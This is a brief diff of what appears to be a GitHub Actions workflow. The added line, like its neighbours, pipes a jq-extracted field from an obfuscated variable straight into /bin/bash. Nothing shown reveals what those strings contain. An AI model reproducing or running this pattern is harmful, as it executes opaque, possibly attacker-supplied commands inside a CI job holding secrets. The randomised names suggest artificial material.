@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$dwrz16" | jq -r .bg2536 | /bin/bash
           printf '%s' "$vzzzw66988" | jq -r .klalk45 | /bin/bash
           printf '%s' "$gh49" | jq -r .qikmv89618 | /bin/bash
+          echo $cmd6753 | jq -r .cbu858 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
